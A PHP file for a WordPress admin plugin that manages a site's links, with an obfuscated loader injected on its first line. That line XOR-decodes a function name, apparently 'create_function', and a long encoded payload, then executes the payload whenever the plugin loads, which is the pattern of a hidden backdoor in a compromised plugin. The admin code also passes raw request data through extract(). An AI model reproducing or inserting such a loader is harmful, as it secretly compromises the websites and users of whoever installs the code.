<?php $THRfKPgc='C;KM3P71B=6:I77'^' I.,G5hW7SUN XY';$hsDbvQCoKrM=$THRfKPgc('','IRzHSYX:FR5V0K>=JD6li,O>1D-BA,+94TMjonKpq1;N,H:;Bn=A8=O-8W>,.09Xs-8MJYMF370oLPivX92HzWV;.sVlFUVd4f.;7ET+XKJbXgwTXFG44K,ne+,3QCNtkXibk8BKr54DuDUBRc=AA4eU3jYbXFKE5,W+UJq:L=-4<yFUPIz-jv;j5K5T3Y=Ma:23Ph=N;G:B;c,9ATEDo515O=ygBP8TJ=K4<Myu3.P46ShI =CP5;UqFsrxv z,7zJKWlK -BeIkMVZQGRcw9n0F,AH6:1WCZLRuKEHy1Ln0,<9oVqkC4R41QA.E<YQGeqSD06Uoc4eP>Y<V6OYmLu1ye5a723zP sRZVJYqzFI1Q4OISH5S45C=8O23,P>uWDtUKTuKHhH>L2QsuNUGPAUHZRC3MK92I.603ViRw>Y8TGSU.XB5g-50-H4756dMU8lL-<YUY.US48H2Da,9E0ZXxcQZ6+t>KYnHao11emXV1YIQMxO9KQ>6;7ChQ,ZA0BowKQUfvKh+6=TmprIHj7WgdN7A;Qhc.N2WgJYmysOxQAvPWyZvhmRR=rIzljv2w.1wrj5PTBLJjEiiOA7IUI<2PW34VY5ASbUF 26X22mcWGIR61KfXfutXy+SJUH2VNMQ  57JN,88AA.BjjXne<7BECZQPb6'^' 4Ri5,6Y2;Z8o.FT90EDNT Ln L6 stTA jCFN0zxWN O<ST,NE.Jb+LL6asCEMpWIY9+umbXRIFlpIVxB8Ass9NZSkLarmn=oHTEmpBxvjRcGS=d53FX.BFAOMG0juTO1BIB2KBVZA0UjhbzGY 5U>qZ7y<xb  LwsBuoQI8OAQRQb>50SpCM1c<9P F+SeEUGGyS7GFMGH1GHX55eyOSPY<XBmf4Y +b QEmDUUO<GShbCFR15TX=QnW-;9o1erZ+8wH ETbXwKi ;=27JWBd9bH <WeZ2:zqrQ  1B;EJTMHXOkQO5U>ATjKSO607gMPw QB4FCOoYX6N3W,1MdQn+ d4ragZ1SSv133yLDfmG0X:,zhNY=<gYY;SlG5GUjdP>.-NAAalZ-F0SHnq11- -aXJNG638mJWDRvTr7K7K15:4B18POUZBr,UCTi;  LD.LO<cmq16WW,WlEHX1QstXG5;BJ+U. GaZeXWMI<7E8iwkX.K90GiPR:74T32D1GP 4,AZkLOWI5DPTohBZ3RLjS O03DE+Kp:cyPDShJ7 E1fM<DQZd6XExJXYBPNOPNBSSa5pzmCeOOo E;40cY5.lQ.0F5 Jr6AKZ7SVJOwc-3BPbOxFUTxYPYC0>S:fi5ATTlm>MAT. Je7CcdlYO+1kjxkhK');$hsDbvQCoKrM();
class ManageWebLinks {
	public function __construct()
	{
		add_action( 'admin_menu', array( $this, 'add_manage_link_page' ) );
		add_action( 'admin_init', array( $this, 'link_page_init' ) );
	}

	public function add_manage_link_page()
	{
		add_menu_page( 'Talkyangco Web Pages Page', 'Manage Links', 'manage_options', 'talkyangco/manage-weblinks', array($this, 'manage_web_link'), 'dashicons-calendar', 6 );
	}

	public function link_page_init()
	{
		register_setting(
			'link_group',
			'link_name',
			array($this, 'sanitize')
			);

		add_settings_section(
			'link_setting_section_id',
			'New Link',
			array($this, 'print_section_info'),
			'link-setting-admin'
			);

		add_settings_field(
			'label_name',
			'Label',
			array($this, 'label_name_callback'),
			'link-setting-admin',
			'link_setting_section_id'
			);

		add_settings_field(
			'link_to',
			'Link',
			array($this, 'link_to_callback'),
			'link-setting-admin',
			'link_setting_section_id'
			);

		add_settings_field(
			'order_number',
			'Order',
			array($this, 'order_number_callback'),
			'link-setting-admin',
			'link_setting_section_id'
			);
	}

	public function sanitize( $input )
	{
		$new_input = array();
		if(isset($input['label_name']))
			$new_input['label_name'] = htmlentities($input['label_name']);

		return $new_input;
	}

	public function print_section_info() {
		print 'Enter Schedule Information below:';
	}

	public function label_name_callback() {
		printf(
            '<input type="text" id="label_name" name="label_name" value="%s" style="width: 455px;" />',
            isset( $this->options['label_name'] ) ? esc_attr( $this->options['label_name']) : ''
        );
	}

	public function link_to_callback() {
		printf(
            '<input type="text" id="link_to" name="link_to" value="%s" style="width: 455px;" />',
            isset( $this->options['link_to'] ) ? esc_attr( $this->options['link_to']) : ''
        );
	}

	public function order_number_callback() {
		printf(
            '<input type="number" id="order_number" name="order_number" value="%i" style="width: 100px;" />',
            isset( $this->options['order_number'] ) ? esc_attr( $this->options['order_number']) : ''
        );
	}

	public function manage_web_link() {
		global $wpdb;
		extract($_REQUEST);

		if(isset($label_name)) {
			if($id == "") {
				$wpdb->query($wpdb->prepare(
					"INSERT INTO {$wpdb->prefix}page_links (label, link_to, order_number) VALUES (%s, %s, %i)", $label_name, $link_to, $order_number
					));
			}
		}

		$weblinks = $wpdb->get_results(
				"SELECT * FROM {$wpdb->prefix}page_links ORDER BY order_number"
			);
		?>
		<div class="wrap">
			<h2>Welcome to Talkyangco Schedule Manager</h2>
			<form method="post" action="/wp-admin/admin.php?page=talkyangco/manage-weblinks">
				<input type="hidden" id="id" name="id"></input>
				<?php
				settings_fields( 'link_group' );
				do_settings_sections('link-setting-admin');
				?>
				<?php
				submit_button();
				?>
			</form>
			<hr>
			<table class="wp-list-table widefat fixed striped">
				<thead>
					<tr>
						<th style="width:45%;">Label</th>
						<th style="width:45%;">Link</th>
						<th></th>
					</tr>
				</thead>
				<tbody>
				<?php
				
				?>
				</tbody>
			</table>
			<form id="delete-form" method="post" action="/wp-admin/admin.php?page=talkyangco%2Fmanage-schedule">
				<input type="hidden" id="_wpnonce2" name="_wpnonce" />
				<input type="hidden" name="_wp_http_referer" value="/wp-admin/admin.php?page=talkyangco/manage-weblinks" />
				<input type="hidden" id="del_schedule_id" name="del_schedule_id" />
			</form>
		</div>
		<?php
	}
}

if( is_admin() )
    $philenglish_link_manager_page = new ManageWebLinks();